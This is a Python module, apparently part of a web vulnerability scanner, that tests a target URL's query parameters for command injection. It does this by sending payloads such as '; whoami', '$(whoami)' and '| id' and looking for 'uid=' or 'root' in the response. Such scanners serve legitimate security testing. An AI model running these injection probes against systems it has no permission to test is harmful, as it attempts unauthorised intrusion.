from typing import Optional
import aiohttp
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

CMD_PAYLOADS = [
    "; whoami",
    "| whoami",
    "`whoami`",
    "$(whoami)",
    "; id",
    "| id",
    "& ping -c 1 127.0.0.1 &",
    "| ping -n 1 127.0.0.1",
]


async def _test_oob(session: aiohttp.ClientSession, url: str, param: str, payload: str) -> bool:
    return False


async def run(target: str, scan_id: Optional[int] = None) -> list[dict]:
    results = []
    url = f"https://{target}" if not target.startswith("http") else target
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        params = {"cmd": [""], "command": [""], "exec": [""], "ping": [""]}

    async with aiohttp.ClientSession() as session:
        for param, values in params.items():
            for payload in CMD_PAYLOADS:
                try:
                    test_params = params.copy()
                    test_params[param] = [payload]
                    test_qs = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_qs))
                    async with session.get(test_url, timeout=aiohttp.ClientTimeout(total=15)) as resp:
                        text = await resp.text()
                        if "root" in text or "uid=" in text or "gid=" in text:
                            results.append({
                                "finding_type": "Command Injection",
                                "severity": "critical",
                                "url": test_url,
                                "parameter": param,
                                "payload": payload,
                                "evidence": f"Command output detected with payload: {payload}",
                            })
                            break
                except Exception:
                    pass
    return results
